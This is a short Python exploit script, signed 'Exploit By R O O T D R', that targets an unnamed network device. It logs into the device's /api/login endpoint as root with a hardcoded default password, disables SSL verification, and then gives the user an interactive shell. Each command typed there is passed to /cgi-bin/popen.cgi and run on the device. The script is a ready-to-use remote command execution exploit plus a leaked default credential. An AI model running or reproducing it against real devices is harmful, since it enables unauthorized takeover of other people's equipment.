from http import cookies
from urllib import response
import requests
import sys
import json
import urllib3

target = sys.argv[1]

def print_banner():
    banner = "Exploit By R O O T D R " 
    print(banner)

print_banner()

# Device Default Password
username = "root"
password = "2wsx#EDC"

# Disable Requests Lib Warning For Self-Signed SSL 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def sendCommand(command,cookie):
    global target
    # Send User Command To Device
    result = requests.get("https://"+target+"/cgi-bin/popen.cgi",cookies={"mgs":cookie},params = {"command":command},verify=False).text

    # Return Device Response And Replace <br> With \n For Printing
    return result.replace("<br>","\n")


while True:
    # Send Authentication Request
    response = requests.post("https://"+target+"/api/login",data = {"user":username,"pass":password},verify=False)
    # Parse Device Response
    authResult = json.loads(response.text)

    # Check Authentication Result
    if("ok" in authResult and authResult["ok"]):
        # Store Response Cookie
        token = response.cookies["mgs"]
        print("[+] Authention Success")

        # Get Input For Send Command To Device
        while True:
            command = input("Command> ")
            print(sendCommand(command,token))

        break
    else:
        print("Default Authentication Failed! Enter correct username and password.. ")

        # Get New Credential 
        username = input("Username: ")
        password = input("Password: ")
